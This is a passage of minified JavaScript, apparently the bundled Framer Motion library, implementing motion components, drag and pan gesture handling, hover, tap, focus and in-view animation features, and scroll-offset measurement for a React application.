Array.isArray(a)?a.join(" "):a}const jS=()=>({style:{},transform:{},transformOrigin:{},vars:{}});function oq(a,e,t){for(const n in e)!wt(e[n])&&!U_(n,t)&&(a[n]=e[n])}function Sie({transformTemplate:a},e){return U.useMemo(()=>{const t=jS();return IS(t,e,a),Object.assign({},t.vars,t.style)},[e])}function Cie(a,e){const t=a.style||{},n={};return oq(n,t,a),Object.assign(n,Sie(a,e)),n}function Tie(a,e){const t={},n=Cie(a,e);return a.drag&&a.dragListener!==!1&&(t.draggable=!1,n.userSelect=n.WebkitUserSelect=n.WebkitTouchCallout="none",n.touchAction=a.drag===!0?"none":`pan-${a.drag==="x"?"y":"x"}`),a.tabIndex===void 0&&(a.onTap||a.onTapStart||a.whileTap)&&(t.tabIndex=0),t.style=n,t}const sq=()=>({...jS(),attrs:{}});function xie(a,e,t,n){const i=U.useMemo(()=>{const r=sq();return z_(r,e,F_(n),a.transformTemplate,a.style),{...r.attrs,style:{...r.style}}},[e]);if(a.style){const r={};oq(r,a.style,a),i.style={...r,...i.style}}return i}const Aie=["animate","circle","defs","desc","ellipse","g","image","line","filter","marker","mask","metadata","path","pattern","polygon","polyline","rect","stop","switch","symbol","svg","text","tspan","use","view"];function DS(a){return typeof a!="string"||a.includes("-")?!1:!!(Aie.indexOf(a)>-1||/[A-Z]/u.test(a))}function Pie(a,e,t,{latestValues:n},i,r=!1,l){const d=(l??DS(a)?xie:Tie)(e,n,i,a),p=vie(e,typeof a=="string",r),f=a!==U.Fragment?{...p,...d,ref:t}:{},{children:h}=e,E=U.useMemo(()=>wt(h)?h.get():h,[h]);return U.createElement(a,{...f,children:E})}function Lie({scrapeMotionValuesFromProps:a,createRenderState:e},t,n,i){return{latestValues:Rie(t,n,i,a),renderState:e()}}function Rie(a,e,t,n){const i={},r=n(a,{});for(const E in r)i[E]=nh(r[E]);let{initial:l,animate:u}=a;const d=Rg(a),p=w_(a);e&&p&&!d&&a.inherit!==!1&&(l===void 0&&(l=e.initial),u===void 0&&(u=e.animate));let f=t?t.initial===!1:!1;f=f||l===!1;const h=f?u:l;if(h&&typeof h!="boolean"&&!Lg(h)){const E=Array.isArray(h)?h:[h];for(let C=0;C<E.length;C++){const A=SS(a,E[C]);if(A){const{transitionEnd:j,transition:R,...I}=A;for(const w in I){let k=I[w];if(Array.isArray(k)){const Y=f?k.length-1:0;k=k[Y]}k!==null&&(i[w]=k)}for(const w in j)i[w]=j[w]}}}return i}const rq=a=>(e,t)=>{const n=U.useContext(wg),i=U.useContext(iS),r=()=>Lie(a,e,n,i);return t?r():Ag(r)},Iie=rq({scrapeMotionValuesFromProps:wS,createRenderState:jS}),wie=rq({scrapeMotionValuesFromProps:V_,createRenderState:sq}),jie=Symbol.for("motionComponentSymbol");function Die(a,e,t){const n=U.useRef(t);U.useInsertionEffect(()=>{n.current=t});const i=U.useRef(null);return U.useCallback(r=>{r&&a.onMount?.(r),e&&(r?e.mount(r):e.unmount());const l=n.current;if(typeof l=="function")if(r){const u=l(r);typeof u=="function"&&(i.current=u)}else i.current?(i.current(),i.current=null):l(r);else l&&(l.current=r)},[e])}const lq=U.createContext({});function fc(a){return a&&typeof a=="object"&&Object.prototype.hasOwnProperty.call(a,"current")}function Mie(a,e,t,n,i,r){const{visualElement:l}=U.useContext(wg),u=U.useContext(tq),d=U.useContext(iS),p=U.useContext(Ig),f=p.reducedMotion,h=p.skipAnimations,E=U.useRef(null),C=U.useRef(!1);n=n||u.renderer,!E.current&&n&&(E.current=n(a,{visualState:e,parent:l,props:t,presenceContext:d,blockInitialAnimation:d?d.initial===!1:!1,reducedMotionConfig:f,skipAnimations:h,isSVG:r}),C.current&&E.current&&(E.current.manuallyAnimateOnMount=!0));const A=E.current,j=U.useContext(lq);A&&!A.projection&&i&&(A.type==="html"||A.type==="svg")&&Nie(E.current,t,i,j);const R=U.useRef(!1);U.useInsertionEffect(()=>{A&&R.current&&A.update(t,d)});const I=t[h_],w=U.useRef(!!I&&!window.MotionHandoffIsComplete?.(I)&&window.MotionHasOptimisedAnimation?.(I));return nS(()=>{C.current=!0,A&&(R.current=!0,window.MotionIsMounted=!0,A.updateFeatures(),A.scheduleRenderMicrotask(),w.current&&A.animationState&&A.animationState.animateChanges())}),U.useEffect(()=>{A&&(!w.current&&A.animationState&&A.animationState.animateChanges(),w.current&&(queueMicrotask(()=>{window.MotionHandoffMarkAsComplete?.(I)}),w.current=!1),A.enteringChildren=void 0)}),A}function Nie(a,e,t,n){const{layoutId:i,layout:r,drag:l,dragConstraints:u,layoutScroll:d,layoutRoot:p,layoutCrossfade:f}=e;a.projection=new t(a.latestValues,e["data-framer-portal-id"]?void 0:cq(a.parent)),a.projection.setOptions({layoutId:i,layout:r,alwaysMeasureLayout:!!l||u&&fc(u),visualElement:a,animationType:typeof r=="string"?r:"both",initialPromotionConfig:n,crossfade:f,layoutScroll:d,layoutRoot:p})}function cq(a){if(a)return a.options.allowProjection!==!1?a.projection:cq(a.parent)}function My(a,{forwardMotionProps:e=!1,type:t}={},n,i){n&&hie(n);const r=t?t==="svg":DS(a),l=r?wie:Iie;function u(p,f){let h;const E={...U.useContext(Ig),...p,layoutId:_ie(p)},{isStatic:C}=E,A=Eie(p),j=l(p,C);if(!C&&LN){qie();const R=kie(E);h=R.MeasureLayout,A.visualElement=Mie(a,j,E,i,R.ProjectionNode,r)}return b.jsxs(wg.Provider,{value:A,children:[h&&A.visualElement?b.jsx(h,{visualElement:A.visualElement,...E}):null,Pie(a,p,Die(j,A.visualElement,f),j,C,e,r)]})}u.displayName=`motion.${typeof a=="string"?a:`create(${a.displayName??a.name??""})`}`;const d=U.forwardRef(u);return d[jie]=a,d}function _ie({layoutId:a}){const e=U.useContext(PN).id;return e&&a!==void 0?e+"-"+a:a}function qie(a,e){U.useContext(tq).strict}function kie(a){const e=nq(),{drag:t,layout:n}=e;if(!t&&!n)return{};const i={...t,...n};return{MeasureLayout:t?.isEnabled(a)||n?.isEnabled(a)?i.MeasureLayout:void 0,ProjectionNode:i.ProjectionNode}}function Oie(a,e){if(typeof Proxy>"u")return My;const t=new Map,n=(r,l)=>My(r,l,a,e),i=(r,l)=>n(r,l);return new Proxy(i,{get:(r,l)=>l==="create"?n:(t.has(l)||t.set(l,My(l,void 0,a,e)),t.get(l))})}const Uie=(a,e)=>e.isSVG??DS(a)?new Cne(e):new gne(e,{allowProjection:a!==U.Fragment});class zie extends ur{constructor(e){super(e),e.animationState||(e.animationState=Lne(e))}updateAnimationControlsSubscription(){const{animate:e}=this.node.getProps();Lg(e)&&(this.unmountControls=e.subscribe(this.node))}mount(){this.updateAnimationControlsSubscription()}update(){const{animate:e}=this.node.getProps(),{animate:t}=this.node.prevProps||{};e!==t&&this.updateAnimationControlsSubscription()}unmount(){this.node.animationState.reset(),this.unmountControls?.()}}let Bie=0;class Fie extends ur{constructor(){super(...arguments),this.id=Bie++}update(){if(!this.node.presenceContext)return;const{isPresent:e,onExitComplete:t}=this.node.presenceContext,{isPresent:n}=this.node.prevPresenceContext||{};if(!this.node.animationState||e===n)return;const i=this.node.animationState.setActive("exit",!e);t&&!e&&i.then(()=>{t(this.id)})}mount(){const{register:e,onExitComplete:t}=this.node.presenceContext||{};t&&t(this.id),e&&(this.unmount=e(this.id))}unmount(){}}const Vie={animation:{Feature:zie},exit:{Feature:Fie}};function Fp(a){return{point:{x:a.pageX,y:a.pageY}}}const Hie=a=>e=>AS(e)&&a(e,Fp(e));function Wd(a,e,t,n){return gp(a,e,Hie(t),n)}const uq=({current:a})=>a?a.ownerDocument.defaultView:null,DR=(a,e)=>Math.abs(a-e);function Gie(a,e){const t=DR(a.x,e.x),n=DR(a.y,e.y);return Math.sqrt(t**2+n**2)}const MR=new Set(["auto","scroll"]);class dq{constructor(e,t,{transformPagePoint:n,contextWindow:i=window,dragSnapToOrigin:r=!1,distanceThreshold:l=3,element:u}={}){if(this.startEvent=null,this.lastMoveEvent=null,this.lastMoveEventInfo=null,this.handlers={},this.contextWindow=window,this.scrollPositions=new Map,this.removeScrollListeners=null,this.onElementScroll=C=>{this.handleScroll(C.target)},this.onWindowScroll=()=>{this.handleScroll(window)},this.updatePoint=()=>{if(!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const C=_y(this.lastMoveEventInfo,this.history),A=this.startEvent!==null,j=Gie(C.offset,{x:0,y:0})>=this.distanceThreshold;if(!A&&!j)return;const{point:R}=C,{timestamp:I}=Lt;this.history.push({...R,timestamp:I});const{onStart:w,onMove:k}=this.handlers;A||(w&&w(this.lastMoveEvent,C),this.startEvent=this.lastMoveEvent),k&&k(this.lastMoveEvent,C)},this.handlePointerMove=(C,A)=>{this.lastMoveEvent=C,this.lastMoveEventInfo=Ny(A,this.transformPagePoint),va.update(this.updatePoint,!0)},this.handlePointerUp=(C,A)=>{this.end();const{onEnd:j,onSessionEnd:R,resumeAnimation:I}=this.handlers;if((this.dragSnapToOrigin||!this.startEvent)&&I&&I(),!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const w=_y(C.type==="pointercancel"?this.lastMoveEventInfo:Ny(A,this.transformPagePoint),this.history);this.startEvent&&j&&j(C,w),R&&R(C,w)},!AS(e))return;this.dragSnapToOrigin=r,this.handlers=t,this.transformPagePoint=n,this.distanceThreshold=l,this.contextWindow=i||window;const d=Fp(e),p=Ny(d,this.transformPagePoint),{point:f}=p,{timestamp:h}=Lt;this.history=[{...f,timestamp:h}];const{onSessionStart:E}=t;E&&E(e,_y(p,this.history)),this.removeListeners=Up(Wd(this.contextWindow,"pointermove",this.handlePointerMove),Wd(this.contextWindow,"pointerup",this.handlePointerUp),Wd(this.contextWindow,"pointercancel",this.handlePointerUp)),u&&this.startScrollTracking(u)}startScrollTracking(e){let t=e.parentElement;for(;t;){const n=getComputedStyle(t);(MR.has(n.overflowX)||MR.has(n.overflowY))&&this.scrollPositions.set(t,{x:t.scrollLeft,y:t.scrollTop}),t=t.parentElement}this.scrollPositions.set(window,{x:window.scrollX,y:window.scrollY}),window.addEventListener("scroll",this.onElementScroll,{capture:!0}),window.addEventListener("scroll",this.onWindowScroll),this.removeScrollListeners=()=>{window.removeEventListener("scroll",this.onElementScroll,{capture:!0}),window.removeEventListener("scroll",this.onWindowScroll)}}handleScroll(e){const t=this.scrollPositions.get(e);if(!t)return;const n=e===window,i=n?{x:window.scrollX,y:window.scrollY}:{x:e.scrollLeft,y:e.scrollTop},r={x:i.x-t.x,y:i.y-t.y};r.x===0&&r.y===0||(n?this.lastMoveEventInfo&&(this.lastMoveEventInfo.point.x+=r.x,this.lastMoveEventInfo.point.y+=r.y):this.history.length>0&&(this.history[0].x-=r.x,this.history[0].y-=r.y),this.scrollPositions.set(e,i),va.update(this.updatePoint,!0))}updateHandlers(e){this.handlers=e}end(){this.removeListeners&&this.removeListeners(),this.removeScrollListeners&&this.removeScrollListeners(),this.scrollPositions.clear(),ei(this.updatePoint)}}function Ny(a,e){return e?{point:e(a.point)}:a}function NR(a,e){return{x:a.x-e.x,y:a.y-e.y}}function _y({point:a},e){return{point:a,delta:NR(a,pq(e)),offset:NR(a,Qie(e)),velocity:Jie(e,.1)}}function Qie(a){return a[0]}function pq(a){return a[a.length-1]}function Jie(a,e){if(a.length<2)return{x:0,y:0};let t=a.length-1,n=null;const i=pq(a);for(;t>=0&&(n=a[t],!(i.timestamp-n.timestamp>Ti(e)));)t--;if(!n)return{x:0,y:0};n===a[0]&&a.length>2&&i.timestamp-n.timestamp>Ti(e)*2&&(n=a[1]);const r=Xn(i.timestamp-n.timestamp);if(r===0)return{x:0,y:0};const l={x:(i.x-n.x)/r,y:(i.y-n.y)/r};return l.x===1/0&&(l.x=0),l.y===1/0&&(l.y=0),l}function Wie(a,{min:e,max:t},n){return e!==void 0&&a<e?a=n?Ja(e,a,n.min):Math.max(a,e):t!==void 0&&a>t&&(a=n?Ja(t,a,n.max):Math.min(a,t)),a}function _R(a,e,t){return{min:e!==void 0?a.min+e:void 0,max:t!==void 0?a.max+t-(a.max-a.min):void 0}}function Kie(a,{top:e,left:t,bottom:n,right:i}){return{x:_R(a.x,t,i),y:_R(a.y,e,n)}}function qR(a,e){let t=e.min-a.min,n=e.max-a.max;return e.max-e.min<a.max-a.min&&([t,n]=[n,t]),{min:t,max:n}}function Yie(a,e){return{x:qR(a.x,e.x),y:qR(a.y,e.y)}}function $ie(a,e){let t=.5;const n=en(a),i=en(e);return i>n?t=Uc(e.min,e.max-n,a.min):n>i&&(t=Uc(a.min,a.max-i,e.min)),Pi(0,1,t)}function Xie(a,e){const t={};return e.min!==void 0&&(t.min=e.min-a.min),e.max!==void 0&&(t.max=e.max-a.min),t}const cE=.35;function Zie(a=cE){return a===!1?a=0:a===!0&&(a=cE),{x:kR(a,"left","right"),y:kR(a,"top","bottom")}}function kR(a,e,t){return{min:OR(a,e),max:OR(a,t)}}function OR(a,e){return typeof a=="number"?a:a[e]||0}const eoe=new WeakMap;class aoe{constructor(e){this.openDragLock=null,this.isDragging=!1,this.currentDirection=null,this.originPoint={x:0,y:0},this.constraints=!1,this.hasMutatedConstraints=!1,this.elastic=bt(),this.latestPointerEvent=null,this.latestPanInfo=null,this.visualElement=e}start(e,{snapToCursor:t=!1,distanceThreshold:n}={}){const{presenceContext:i}=this.visualElement;if(i&&i.isPresent===!1)return;const r=h=>{t&&this.snapToCursor(Fp(h).point),this.stopAnimation()},l=(h,E)=>{const{drag:C,dragPropagation:A,onDragStart:j}=this.getProps();if(C&&!A&&(this.openDragLock&&this.openDragLock(),this.openDragLock=Mte(C),!this.openDragLock))return;this.latestPointerEvent=h,this.latestPanInfo=E,this.isDragging=!0,this.currentDirection=null,this.resolveConstraints(),this.visualElement.projection&&(this.visualElement.projection.isAnimationBlocked=!0,this.visualElement.projection.target=void 0),Zi(I=>{let w=this.getAxisMotionValue(I).get()||0;if(ro.test(w)){const{projection:k}=this.visualElement;if(k&&k.layout){const Y=k.layout.layoutBox[I];Y&&(w=en(Y)*(parseFloat(w)/100))}}this.originPoint[I]=w}),j&&va.update(()=>j(h,E),!1,!0),eE(this.visualElement,"transform");const{animationState:R}=this.visualElement;R&&R.setActive("whileDrag",!0)},u=(h,E)=>{this.latestPointerEvent=h,this.latestPanInfo=E;const{dragPropagation:C,dragDirectionLock:A,onDirectionLock:j,onDrag:R}=this.getProps();if(!C&&!this.openDragLock)return;const{offset:I}=E;if(A&&this.currentDirection===null){this.currentDirection=noe(I),this.currentDirection!==null&&j&&j(this.currentDirection);return}this.updateAxis("x",E.point,I),this.updateAxis("y",E.point,I),this.visualElement.render(),R&&va.update(()=>R(h,E),!1,!0)},d=(h,E)=>{this.latestPointerEvent=h,this.latestPanInfo=E,this.stop(h,E),this.latestPointerEvent=null,this.latestPanInfo=null},p=()=>{const{dragSnapToOrigin:h}=this.getProps();(h||this.constraints)&&this.startAnimation({x:0,y:0})},{dragSnapToOrigin:f}=this.getProps();this.panSession=new dq(e,{onSessionStart:r,onStart:l,onMove:u,onSessionEnd:d,resumeAnimation:p},{transformPagePoint:this.visualElement.getTransformPagePoint(),dragSnapToOrigin:f,distanceThreshold:n,contextWindow:uq(this.visualElement),element:this.visualElement.current})}stop(e,t){const n=e||this.latestPointerEvent,i=t||this.latestPanInfo,r=this.isDragging;if(this.cancel(),!r||!i||!n)return;const{velocity:l}=i;this.startAnimation(l);const{onDragEnd:u}=this.getProps();u&&va.postRender(()=>u(n,i))}cancel(){this.isDragging=!1;const{projection:e,animationState:t}=this.visualElement;e&&(e.isAnimationBlocked=!1),this.endPanSession();const{dragPropagation:n}=this.getProps();!n&&this.openDragLock&&(this.openDragLock(),this.openDragLock=null),t&&t.setActive("whileDrag",!1)}endPanSession(){this.panSession&&this.panSession.end(),this.panSession=void 0}updateAxis(e,t,n){const{drag:i}=this.getProps();if(!n||!jf(e,i,this.currentDirection))return;const r=this.getAxisMotionValue(e);let l=this.originPoint[e]+n[e];this.constraints&&this.constraints[e]&&(l=Wie(l,this.constraints[e],this.elastic[e])),r.set(l)}resolveConstraints(){const{dragConstraints:e,dragElastic:t}=this.getProps(),n=this.visualElement.projection&&!this.visualElement.projection.layout?this.visualElement.projection.measure(!1):this.visualElement.projection?.layout,i=this.constraints;e&&fc(e)?this.constraints||(this.constraints=this.resolveRefConstraints()):e&&n?this.constraints=Kie(n.layoutBox,e):this.constraints=!1,this.elastic=Zie(t),i!==this.constraints&&!fc(e)&&n&&this.constraints&&!this.hasMutatedConstraints&&Zi(r=>{this.constraints!==!1&&this.getAxisMotionValue(r)&&(this.constraints[r]=Xie(n.layoutBox[r],this.constraints[r]))})}resolveRefConstraints(){const{dragConstraints:e,onMeasureDragConstraints:t}=this.getProps();if(!e||!fc(e))return!1;const n=e.current,{projection:i}=this.visualElement;if(!i||!i.layout)return!1;const r=une(n,i.root,this.visualElement.getTransformPagePoint());let l=Yie(i.layout.layoutBox,r);if(t){const u=t(rne(l));this.hasMutatedConstraints=!!u,u&&(l=N_(u))}return l}startAnimation(e){const{drag:t,dragMomentum:n,dragElastic:i,dragTransition:r,dragSnapToOrigin:l,onDragTransitionEnd:u}=this.getProps(),d=this.constraints||{},p=Zi(f=>{if(!jf(f,t,this.currentDirection))return;let h=d&&d[f]||{};l&&(h={min:0,max:0});const E=i?200:1e6,C=i?40:1e7,A={type:"inertia",velocity:n?e[f]:0,bounceStiffness:E,bounceDamping:C,timeConstant:750,restDelta:1,restSpeed:10,...r,...h};return this.startAxisValueAnimation(f,A)});return Promise.all(p).then(u)}startAxisValueAnimation(e,t){const n=this.getAxisMotionValue(e);return eE(this.visualElement,e),n.start(ES(e,n,0,t,this.visualElement,!1))}stopAnimation(){Zi(e=>this.getAxisMotionValue(e).stop())}getAxisMotionValue(e){const t=`_drag${e.toUpperCase()}`,n=this.visualElement.getProps(),i=n[t];return i||this.visualElement.getValue(e,(n.initial?n.initial[e]:void 0)||0)}snapToCursor(e){Zi(t=>{const{drag:n}=this.getProps();if(!jf(t,n,this.currentDirection))return;const{projection:i}=this.visualElement,r=this.getAxisMotionValue(t);if(i&&i.layout){const{min:l,max:u}=i.layout.layoutBox[t],d=r.get()||0;r.set(e[t]-Ja(l,u,.5)+d)}})}scalePositionWithinConstraints(){if(!this.visualElement.current)return;const{drag:e,dragConstraints:t}=this.getProps(),{projection:n}=this.visualElement;if(!fc(t)||!n||!this.constraints)return;this.stopAnimation();const i={x:0,y:0};Zi(l=>{const u=this.getAxisMotionValue(l);if(u&&this.constraints!==!1){const d=u.get();i[l]=$ie({min:d,max:d},this.constraints[l])}});const{transformTemplate:r}=this.visualElement.getProps();this.visualElement.current.style.transform=r?r({},""):"none",n.root&&n.root.updateScroll(),n.updateLayout(),this.constraints=!1,this.resolveConstraints(),Zi(l=>{if(!jf(l,e,null))return;const u=this.getAxisMotionValue(l),{min:d,max:p}=this.constraints[l];u.set(Ja(d,p,i[l]))}),this.visualElement.render()}addListeners(){if(!this.visualElement.current)return;eoe.set(this.visualElement,this);const e=this.visualElement.current,t=Wd(e,"pointerdown",p=>{const{drag:f,dragListener:h=!0}=this.getProps(),E=p.target,C=E!==e&&Ute(E);f&&h&&!C&&this.start(p)});let n;const i=()=>{const{dragConstraints:p}=this.getProps();fc(p)&&p.current&&(this.constraints=this.resolveRefConstraints(),n||(n=toe(e,p.current,()=>this.scalePositionWithinConstraints())))},{projection:r}=this.visualElement,l=r.addEventListener("measure",i);r&&!r.layout&&(r.root&&r.root.updateScroll(),r.updateLayout()),va.read(i);const u=gp(window,"resize",()=>this.scalePositionWithinConstraints()),d=r.addEventListener("didUpdate",(({delta:p,hasLayoutChanged:f})=>{this.isDragging&&f&&(Zi(h=>{const E=this.getAxisMotionValue(h);E&&(this.originPoint[h]+=p[h].translate,E.set(E.get()+p[h].translate))}),this.visualElement.render())}));return()=>{u(),t(),l(),d&&d(),n&&n()}}getProps(){const e=this.visualElement.getProps(),{drag:t=!1,dragDirectionLock:n=!1,dragPropagation:i=!1,dragConstraints:r=!1,dragElastic:l=cE,dragMomentum:u=!0}=e;return{...e,drag:t,dragDirectionLock:n,dragPropagation:i,dragConstraints:r,dragElastic:l,dragMomentum:u}}}function UR(a){let e=!0;return()=>{if(e){e=!1;return}a()}}function toe(a,e,t){const n=iE(a,UR(t)),i=iE(e,UR(t));return()=>{n(),i()}}function jf(a,e,t){return(e===!0||e===a)&&(t===null||t===a)}function noe(a,e=10){let t=null;return Math.abs(a.y)>e?t="y":Math.abs(a.x)>e&&(t="x"),t}class ioe extends ur{constructor(e){super(e),this.removeGroupControls=gn,this.removeListeners=gn,this.controls=new aoe(e)}mount(){const{dragControls:e}=this.node.getProps();e&&(this.removeGroupControls=e.subscribe(this.controls)),this.removeListeners=this.controls.addListeners()||gn}update(){const{dragControls:e}=this.node.getProps(),{dragControls:t}=this.node.prevProps||{};e!==t&&(this.removeGroupControls(),e&&(this.removeGroupControls=e.subscribe(this.controls)))}unmount(){this.removeGroupControls(),this.removeListeners(),this.controls.isDragging||this.controls.endPanSession()}}const qy=a=>(e,t)=>{a&&va.update(()=>a(e,t),!1,!0)};class ooe extends ur{constructor(){super(...arguments),this.removePointerDownListener=gn}onPointerDown(e){this.session=new dq(e,this.createPanHandlers(),{transformPagePoint:this.node.getTransformPagePoint(),contextWindow:uq(this.node)})}createPanHandlers(){const{onPanSessionStart:e,onPanStart:t,onPan:n,onPanEnd:i}=this.node.getProps();return{onSessionStart:qy(e),onStart:qy(t),onMove:qy(n),onEnd:(r,l)=>{delete this.session,i&&va.postRender(()=>i(r,l))}}}mount(){this.removePointerDownListener=Wd(this.node.current,"pointerdown",e=>this.onPointerDown(e))}update(){this.session&&this.session.updateHandlers(this.createPanHandlers())}unmount(){this.removePointerDownListener(),this.session&&this.session.end()}}let ky=!1;class soe extends U.Component{componentDidMount(){const{visualElement:e,layoutGroup:t,switchLayoutGroup:n,layoutId:i}=this.props,{projection:r}=e;r&&(t.group&&t.group.add(r),n&&n.register&&i&&n.register(r),ky&&r.root.didUpdate(),r.addEventListener("animationComplete",()=>{this.safeToRemove()}),r.setOptions({...r.options,layoutDependency:this.props.layoutDependency,onExitComplete:()=>this.safeToRemove()})),ih.hasEverUpdated=!0}getSnapshotBeforeUpdate(e){const{layoutDependency:t,visualElement:n,drag:i,isPresent:r}=this.props,{projection:l}=n;return l&&(l.isPresent=r,e.layoutDependency!==t&&l.setOptions({...l.options,layoutDependency:t}),ky=!0,i||e.layoutDependency!==t||t===void 0||e.isPresent!==r?l.willUpdate():this.safeToRemove(),e.isPresent!==r&&(r?l.promote():l.relegate()||va.postRender(()=>{const u=l.getStack();(!u||!u.members.length)&&this.safeToRemove()}))),null}componentDidUpdate(){const{projection:e}=this.props.visualElement;e&&(e.root.didUpdate(),xS.postRender(()=>{!e.currentAnimation&&e.isLead()&&this.safeToRemove()}))}componentWillUnmount(){const{visualElement:e,layoutGroup:t,switchLayoutGroup:n}=this.props,{projection:i}=e;ky=!0,i&&(i.scheduleCheckAfterUnmount(),t&&t.group&&t.group.remove(i),n&&n.deregister&&n.deregister(i))}safeToRemove(){const{safeToRemove:e}=this.props;e&&e()}render(){return null}}function mq(a){const[e,t]=mie(),n=U.useContext(PN);return b.jsx(soe,{...a,layoutGroup:n,switchLayoutGroup:U.useContext(lq),isPresent:e,safeToRemove:t})}const roe={pan:{Feature:ooe},drag:{Feature:ioe,ProjectionNode:aq,MeasureLayout:mq}};function zR(a,e,t){const{props:n}=a;a.animationState&&n.whileHover&&a.animationState.setActive("whileHover",t==="Start");const i="onHover"+t,r=n[i];r&&va.postRender(()=>r(e,Fp(e)))}class loe extends ur{mount(){const{current:e}=this.node;e&&(this.unmount=_te(e,(t,n)=>(zR(this.node,n,"Start"),i=>zR(this.node,i,"End"))))}unmount(){}}class coe extends ur{constructor(){super(...arguments),this.isActive=!1}onFocus(){let e=!1;try{e=this.node.current.matches(":focus-visible")}catch{e=!0}!e||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!0),this.isActive=!0)}onBlur(){!this.isActive||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!1),this.isActive=!1)}mount(){this.unmount=Up(gp(this.node.current,"focus",()=>this.onFocus()),gp(this.node.current,"blur",()=>this.onBlur()))}unmount(){}}function BR(a,e,t){const{props:n}=a;if(a.current instanceof HTMLButtonElement&&a.current.disabled)return;a.animationState&&n.whileTap&&a.animationState.setActive("whileTap",t==="Start");const i="onTap"+(t==="End"?"":t),r=n[i];r&&va.postRender(()=>r(e,Fp(e)))}class uoe extends ur{mount(){const{current:e}=this.node;if(!e)return;const{globalTapTarget:t,propagate:n}=this.node.props;this.unmount=Bte(e,(i,r)=>(BR(this.node,r,"Start"),(l,{success:u})=>BR(this.node,l,u?"End":"Cancel")),{useGlobalTarget:t,stopPropagation:n?.tap===!1})}unmount(){}}const uE=new WeakMap,Oy=new WeakMap,doe=a=>{const e=uE.get(a.target);e&&e(a)},poe=a=>{a.forEach(doe)};function moe({root:a,...e}){const t=a||document;Oy.has(t)||Oy.set(t,{});const n=Oy.get(t),i=JSON.stringify(e);return n[i]||(n[i]=new IntersectionObserver(poe,{root:a,...e})),n[i]}function foe(a,e,t){const n=moe(e);return uE.set(a,t),n.observe(a),()=>{uE.delete(a),n.unobserve(a)}}const hoe={some:0,all:1};class goe extends ur{constructor(){super(...arguments),this.hasEnteredView=!1,this.isInView=!1}startObserver(){this.unmount();const{viewport:e={}}=this.node.getProps(),{root:t,margin:n,amount:i="some",once:r}=e,l={root:t?t.current:void 0,rootMargin:n,threshold:typeof i=="number"?i:hoe[i]},u=d=>{const{isIntersecting:p}=d;if(this.isInView===p||(this.isInView=p,r&&!p&&this.hasEnteredView))return;p&&(this.hasEnteredView=!0),this.node.animationState&&this.node.animationState.setActive("whileInView",p);const{onViewportEnter:f,onViewportLeave:h}=this.node.getProps(),E=p?f:h;E&&E(d)};return foe(this.node.current,l,u)}mount(){this.startObserver()}update(){if(typeof IntersectionObserver>"u")return;const{props:e,prevProps:t}=this.node;["amount","margin","root"].some(boe(e,t))&&this.startObserver()}unmount(){}}function boe({viewport:a={}},{viewport:e={}}={}){return t=>a[t]!==e[t]}const voe={inView:{Feature:goe},tap:{Feature:uoe},focus:{Feature:coe},hover:{Feature:loe}},yoe={layout:{ProjectionNode:aq,MeasureLayout:mq}},Eoe={...Vie,...voe,...roe,...yoe},Soe=Oie(Eoe,Uie);function Coe(a,e,t){U.useInsertionEffect(()=>a.on(e,t),[a,e,t])}const Toe=50,FR=()=>({current:0,offset:[],progress:0,scrollLength:0,targetOffset:0,targetLength:0,containerLength:0,velocity:0}),xoe=()=>({time:0,x:FR(),y:FR()}),Aoe={x:{length:"Width",position:"Left"},y:{length:"Height",position:"Top"}};function VR(a,e,t,n){const i=t[e],{length:r,position:l}=Aoe[e],u=i.current,d=t.time;i.current=a[`scroll${l}`],i.scrollLength=a[`scroll${r}`]-a[`client${r}`],i.offset.length=0,i.offset[0]=0,i.offset[1]=i.scrollLength,i.progress=Uc(0,i.scrollLength,i.current);const p=n-d;i.velocity=p>Toe?0:rS(i.current-u,p)}function Poe(a,e,t){VR(a,"x",e,t),VR(a,"y",e,t),e.time=t}function Loe(a,e){const t={x:0,y:0};let n=a;for(;n&&n!==e;)if(x_(n))t.x+=n.offsetLeft,t.y+=n.offsetTop,n=n.offsetParent;else if(n.tagName==="svg"){const i=n.getBoundingClientRect();n=n.parentElement;const r=n.getBoundingClientRect();t.x+=i.left-r.left,t.y+=i.top-r.top}else if(n instanceof SVGGraphicsElement){const{x:i,y:r}=n.getBBox();t.x+=i,t.y+=r;let l=null,u=n.parentNode;for(;!l;)u.tagName==="svg"&&(l=u),u=n.parentNode;n=l}else break;return t}const dE={start:0,center:.5,end:1};function HR(a,e,t=0){let n=0;if(a in dE&&(a=dE[a]),typeof a=="string"){const i=parseFloat(a);a.endsWith("px")?n=i:a.endsWith("%")?a=i/100:a.endsWith("vw")?n=i/100*document.documentElement.clientWidth:a.endsWith("vh")?n=i/100*document.documentElement.clientHeight:a=i}return typeof a=="number"&&(n=e*a),t+n}const Roe=[0,0];function Ioe(a,e,t,n){let i=Array.isArray(a)?a:Roe,r=0,l=0;return typeof a=="number"?i=[a,a]:typeof a=="string"&&(a=a.trim(),a.includes(" ")?i=a.split(" "):i=[a,dE[a]?a:"0"]),r=HR(i[0],t,n),l=HR(i[1],e),r-l}const woe={All:[[0,0],[1,1]]},joe={x:0,y:0};function Doe(a){return"getBBox"in a&&a.tagName!=="svg"?a.getBBox():{width:a.clientWidth,height:a.clientHeight}}function Moe(a,e,t){const{offset:n=woe.All}=t,{target:i=a,axis:r="y"}=t,l=r==="y"?"height":"width",u=i!==a?Loe(i,a):joe,d=i===a?{width:a.scrollWidth,height:a.scrollHeight}:Doe(i),p={width:a.clientWidth,height:a.clientHeight};e[r].offset.length=0;let f=!e[r].interpolate;const h=n.length;for(let E=0;E<h;E++){const C=Ioe(n[E],p[l],d[l],u[r]);!f&&C!==e[r].interpolatorOffsets[E]&&(f=!0),e[r].offset[E]=C}f&&(e[r].interpolate=hS(e[r].offset,e_(n),{clamp:!1}),e[r].interpolatorOffsets=[...e[r].offset]),e[r].progress=Pi(0,1,e[r].interpolate(e[r].current))}function Noe(a,e=a,t){if(t.x.targetOffset=0,t.y.targetOffset=0,e!==a){let n=e;for(;n&&n!==a;)t.x.targetOffset+=n.offsetLeft,t.y.targetOffset+=n.offsetTop,n=n.offsetParent}t.x.targetLength=e===a?e.scrollWidth:e.clientWidth,t.y.targetLength=e===a?e.scrollHeight:e.clientHeight,t.x.containerLength=a.clientWidth,t.y.containerLength=a.clientHeight}function 